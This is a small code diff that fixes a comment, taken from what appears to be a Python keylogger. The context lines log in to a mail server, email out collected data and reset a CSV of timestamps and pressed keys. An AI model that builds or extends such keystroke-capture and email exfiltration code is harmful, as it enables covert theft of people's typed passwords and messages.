@@ -47,7 +47,7 @@ def sendEmail(tetxt):
         server.login(sender_email, password)
         server.sendmail(sender_email, receiver_email, text)
         
-    #Clearing the data file for new data entry :
+    #Clearing the data file for new data entry
     with open('Datafile/data.csv', mode ='w', newline='') as file:
      csvwriter = csv.writer(file) 
      csvwriter.writerows([['TIMESTAMP', 'KEY PRESSED']])
